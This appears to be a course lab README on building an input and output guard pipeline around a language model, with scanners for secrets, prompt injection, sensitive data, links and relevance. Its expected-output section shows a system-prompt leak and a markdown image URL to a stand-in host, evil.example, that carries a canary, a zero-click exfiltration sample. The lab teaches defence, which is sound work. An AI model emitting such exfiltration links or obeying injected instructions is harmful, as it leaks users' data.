# Lab: Guarding LLM Input and Output

**Course exercise:** "Guarding LLM Input and Output". A small AI firewall pipeline around a model.

**Time:** 30-40 minutes. Offline.

```text
.venv/Scripts/python caisp-course/ch4-ai-attacks-and-defenses-devops/labs/guard-io/demo.py
.venv/Scripts/python -m pytest caisp-course/ch4-ai-attacks-and-defenses-devops/labs/guard-io -v
```

```text
user -> input scanners -> model -> output scanners -> user
        (Secrets, PromptInjection)   (Sensitive, LinkGuard, Relevance)
```

## Scanners

| Side | Scanner | Does |
|---|---|---|
| Input | `Secrets` | Redacts API keys before the model sees them |
| Input | `PromptInjection` | Blocks known injection phrases (soft) |
| Output | `Sensitive` | Redacts emails and canaries |
| Output | `LinkGuard` | Removes markdown images and links to domains that are not on an allowlist. This stops the zero-click image exfiltration trick |
| Output | `Relevance` | Blocks answers that have almost nothing to do with the question |

## Expected output

```text
[injection]
  unguarded: Sure! My instructions are: 
  guarded  : [blocked by guard]
  log      : ['input:PromptInjection:prompt injection pattern']
[image exfiltration]
  unguarded: Done. ![status](https://evil.example/p.png?d=ACCT-1fc3e1b5c4)
  guarded  : [blocked by guard]
  log      : ['output:Sensitive:redacted', 'output:LinkGuard:links removed', 'output:Relevance:relevance 0.00']
[PII in answer]
  unguarded: The account owner is bob@corp.example.
  guarded  : The account owner is [REDACTED_EMAIL].
  log      : ['output:Sensitive:redacted']
[unknown link]
  unguarded: See https://docs.corp.example/refunds and also https://evil.example/lo
  guarded  : See https://docs.corp.example/refunds and also [link removed] for deta
  log      : ['output:LinkGuard:links removed']
[off topic]
  unguarded: Bananas are yellow and grow in bunches.
  guarded  : [blocked by guard]
  log      : ['output:Relevance:relevance 0.00']
[benign]
  unguarded: Here is a helpful answer about: How do refunds work for annual plans?
  guarded  : Here is a helpful answer about: How do refunds work for annual plans?
  log      : []
```

## What the tests prove

- The unguarded model puts a canary into an image URL for `evil.example`. The guard removes the image and the canary.
- **Each output scanner alone is enough** to stop the exfiltration: `LinkGuard` removes the channel, `Sensitive` removes the data. Defense in depth.
- The input filter is soft: a paraphrase of an override reaches the model. That is why output guards, least privilege and data minimization are still needed.
- A benign question passes untouched.

## Break it yourself

- Allow images from `docs.corp.example` only. Where does the allowlist check belong?
- Add an output scanner that blocks a system-prompt leak by looking for a canary phrase from the system prompt.
- Make the pipeline fail closed: if a scanner raises an error, return the blocked message and log it.

## Real tool

The same pipeline with the real `llm-guard` library is in [`notebooks/llm-guard-real.ipynb`](../../notebooks/llm-guard-real.ipynb). Commercial and platform options exist (Lakera Guard, Azure AI Content Safety "Prompt Shields", cloud model guardrails). Compare features from their own documentation.

## Related

- Previous lab: [llm-guard-sanitize](../llm-guard-sanitize/README.md)
- Repo: the exfiltration technique in [02-llm-security/data-leakage](../../../../02-llm-security/data-leakage/README.md), layered guardrails in [02-llm-security/jailbreak](../../../../02-llm-security/jailbreak/README.md), gateway controls in [06 runtime-security](../../../../06-ai-devsecops/runtime-security/README.md)
